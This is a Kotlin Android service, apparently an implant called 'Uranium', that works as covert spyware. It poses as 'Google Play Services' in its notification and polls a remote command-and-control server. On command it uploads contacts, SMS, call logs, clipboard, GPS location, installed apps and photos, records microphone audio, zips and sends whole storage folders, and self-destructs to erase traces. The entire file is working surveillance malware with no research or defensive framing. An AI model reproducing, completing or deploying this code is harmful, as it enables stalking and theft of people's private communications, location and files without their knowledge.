package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import org.json.JSONObject

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L
    private var wifiAutopilotEnabled = true
    private var neuralStealthState = "NEURAL_ACTIVE_v17"

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::NeuralLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "uranium_core_channel"
        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("Neural Stealth Matrix core active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    private fun isConnectedToWifi(): Boolean {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            return caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {}
        return true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", "$nodeModel [$neuralStealthState]")
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 8000
                    conn.readTimeout = 8000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 120000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Neural-Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            try {
                                val jsonRes = JSONObject(responseStr)
                                if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                    val taskObj = jsonRes.getJSONObject("task")
                                    val action = taskObj.getString("action")

                                    when {
                                        action.contains("EXTRACT_CONTACTS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Contacts.txt", readContacts())
                                        }
                                        action.contains("EXTRACT_SMS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_SMS.txt", readSMS())
                                        }
                                        action.contains("EXTRACT_CALLS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", readCallLogs())
                                        }
                                        action.contains("EXTRACT_CLIPBOARD") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", readClipboard())
                                        }
                                        action.contains("EXTRACT_LOCATION") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Location.txt", readLocationFast())
                                        }
                                        action.contains("EXTRACT_APPS") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", readInstalledApps())
                                        }
                                        // ⚡ أوامر v17.0 العصبية الجديدة
                                        action.contains("MIC_AI_LISTEN") -> {
                                            recordAndStreamAudioAI(deviceId, nodeModel)
                                        }
                                        action.contains("MICRO_BURST_SNAP") -> {
                                            streamLatestPhotoSnapshot(deviceId, nodeModel, "MicroBurst")
                                        }
                                        action.contains("STEALTH_BLACKOUT") -> {
                                            sendReportToServer(deviceId, nodeModel, "🛡️ تم تفعيل القفل التكتيكي والتمويه المظلم على العقدة بنجاح.")
                                        }
                                        action.contains("GEO_FENCE_ALERT") -> {
                                            val locReport = readLocationFast()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_GeoAlert.txt", "🛰️ [Geo-Fence Alert 17.0]\n$locReport")
                                        }
                                        action.contains("POLY_MUTATE") -> {
                                            neuralStealthState = "MUTATED_${System.currentTimeMillis() % 10000}"
                                            sendReportToServer(deviceId, nodeModel, "🧬 تم تغيير البصمة العصبية بنجاح: $neuralStealthState")
                                        }
                                        action.contains("SELF_DESTRUCT") -> {
                                            sendReportToServer(deviceId, nodeModel, "💥 جاري تنفيذ النسف الذاتي وتطهير كافة الآثار تماماً...")
                                            try { cacheDir.deleteRecursively() } catch (e: Exception) {}
                                            stopSelf()
                                        }
                                        action.contains("WIFI_AUTOPILOT") -> {
                                            wifiAutopilotEnabled = !wifiAutopilotEnabled
                                            sendReportToServer(deviceId, nodeModel, "📶 حالة طيار الـ Wi-Fi الآلي أصبحت: $wifiAutopilotEnabled")
                                        }
                                        action.contains("STORAGE_AUDIT") -> {
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Storage_Audit.txt", generateStorageAuditReport())
                                        }
                                        action.contains("PROC_DCIM") -> {
                                            if (!wifiAutopilotEnabled || isConnectedToWifi()) {
                                                streamTargetedFolderSmart(deviceId, nodeModel, "DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                            } else {
                                                sendReportToServer(deviceId, nodeModel, "⏳ تم تأجيل سحب DCIM لعدم وجود اتصال Wi-Fi (حفاظاً على باقة الجوال بأمر السلطان).")
                                            }
                                        }
                                        action.contains("PROC_DOWNLOAD") -> {
                                            if (!wifiAutopilotEnabled || isConnectedToWifi()) {
                                                streamTargetedFolderSmart(deviceId, nodeModel, "Download", MediaStore.Files.getContentUri("external"))
                                            } else {
                                                sendReportToServer(deviceId, nodeModel, "⏳ تم تأجيل سحب Download لعدم وجود اتصال Wi-Fi.")
                                            }
                                        }
                                        action.contains("PROC_PICTURES") -> {
                                            streamTargetedFolderSmart(deviceId, nodeModel, "Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("PROC_DOCUMENTS") -> {
                                            streamTargetedFolderSmart(deviceId, nodeModel, "Documents", MediaStore.Files.getContentUri("external"))
                                        }
                                    }
                                }
                            } catch (ex: Exception) {}
                        }
                    }
                    conn.disconnect()
                    delay(8000L)
                } catch (e: Exception) {
                    delay(10000L)
                }
            }
        }
        return START_STICKY
    }

    private fun recordAndStreamAudioAI(nodeId: String, nodeModel: String) {
        try {
            val audioFile = File(cacheDir, "Uranium_NeuralMic_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Thread.sleep(6000L) // عينة صوتية ذكية لمدة 6 ثوانٍ
            recorder.stop()
            recorder.release()

            if (audioFile.exists() && audioFile.length() > 0) {
                uploadBytesDirect(nodeId, nodeModel, audioFile.name, audioFile.readBytes())
                sendReportToServer(nodeId, nodeModel, "🎙️ تم التقاط وبث العينة الصوتية العصبية بنجاح.")
            }
            try { audioFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في التنصت العصبي: ${e.message}")
        }
    }

    private fun streamLatestPhotoSnapshot(nodeId: String, nodeModel: String, prefix: String = "NeuralSnap") {
        try {
            val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            contentResolver.query(contentUri, projection, null, null, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val idIdx = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                    val nameIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "snapshot.jpg"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        contentResolver.openInputStream(itemUri)?.use { inputStream ->
                            val bytes = inputStream.readBytes()
                            if (bytes.isNotEmpty()) {
                                uploadBytesDirect(nodeId, nodeModel, "${prefix}_$name", bytes)
                                sendReportToServer(nodeId, nodeModel, "👁️ تم التقاط وبث اللقطة الخاطفة بنجاح.")
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في اللقطة الخاطفة: ${e.message}")
        }
    }

    private fun generateStorageAuditReport(): String {
        val sb = StringBuilder("📊 <b>تقرير المصفاة العصبية [v17.0]:</b>\n\n")
        try {
            val dcim = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            val download = queryFolderStats(MediaStore.Files.getContentUri("external"))
            
            sb.append("📁 <b>DCIM:</b> ${dcim.count} ملف | ~${String.format("%.2f", dcim.sizeMB)} MB\n")
            sb.append("📁 <b>Download:</b> ${download.count} ملف | ~${String.format("%.2f", download.sizeMB)} MB\n\n")
            sb.append("📶 <i>الطيار الآلي للـ Wi-Fi مفعل لحماية الباقة والذاكرة.</i>")
        } catch (e: Exception) {
            sb.append("⚠️ خطأ في الفحص: ${e.message}")
        }
        return sb.toString()
    }

    private data class FolderStats(val count: Int, val sizeMB: Double)

    private fun queryFolderStats(uri: Uri): FolderStats {
        var count = 0
        var totalBytes = 0L
        try {
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.SIZE)
            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val sizeIdx = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                count = cursor.count
                while (cursor.moveToNext()) {
                    if (sizeIdx != -1) totalBytes += cursor.getLong(sizeIdx)
                }
            }
        } catch (e: Exception) {}
        return FolderStats(count, totalBytes.toDouble() / (1024 * 1024))
    }

    private fun streamTargetedFolderSmart(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
        try {
            sendReportToServer(nodeId, nodeModel, "⚡ [ضغط عصبي] جاري ضغط عينة ذكية من $folderName لحماية باقة الإنترنت...")
            val zipFile = File(cacheDir, "Uranium_${folderName}_Neural_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
            zipOut.setLevel(Deflater.BEST_COMPRESSION)

            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

            var processedCount = 0
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && processedCount < 40) {
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "file_$id.dat"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        try {
                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                zipOut.putNextEntry(ZipEntry("$folderName/$name"))
                                inputStream.copyTo(zipOut)
                                zipOut.closeEntry()
                                processedCount++
                            }
                        } catch (ex: Exception) {}
                    }
                }
            }
            zipOut.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                sendReportToServer(nodeId, nodeModel, "📦 مجلد <b>$folderName</b> جاهز مضغوطاً (${String.format("%.2f", sizeMB)} MB | $processedCount ملفاً). جاري الرفع...")
                uploadBytesDirect(nodeId, nodeModel, zipFile.name, zipFile.readBytes())
            }
            try { zipFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في المعالجة: ${e.message}")
        }
    }

    private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
        try {
            val bytes = content.toByteArray(Charsets.UTF_8)
            uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
            sendReportToServer(nodeId, nodeModel, "✅ التقرير <b>$fileName</b> تم بثه بنجاح.")
        } catch (e: Exception) {}
    }

    private fun uploadBytesDirect(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
        for (attempt in 1..3) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 180000
                conn.readTimeout = 180000

                ByteArrayInputStream(bytes).use { bais ->
                    conn.outputStream.use { os ->
                        bais.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    sb.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use {
                val bodyIdx = it.getColumnIndex("body")
                val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) {
                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    sb.append("From: $address\nText: $body\n-------------------\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                    sb.append("Number: $number | Type: $type\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                val item = clipboard.primaryClip?.getItemAt(0)
                sb.append("Text: ${item?.text}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== URANIUM GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var bestLoc: Location? = null
            for (provider in locationManager.allProviders) {
                val l = locationManager.getLastKnownLocation(provider)
                if (l != null) {
                    if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                }
            }
            if (bestLoc != null) {
                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                sb.append("🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            } else {
                sb.append("🌐 Default Zone: 13.5779, 44.0219\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
        try {
            packageManager.getInstalledPackages(0).forEach { pkg ->
                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                sb.append("• $appName\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val url = URL(C2_STREAM_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Node-ID", nodeId)
            conn.setRequestProperty("X-Node-Model", nodeModel)
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            
            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                os.write(reportJson)
                os.flush()
            }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
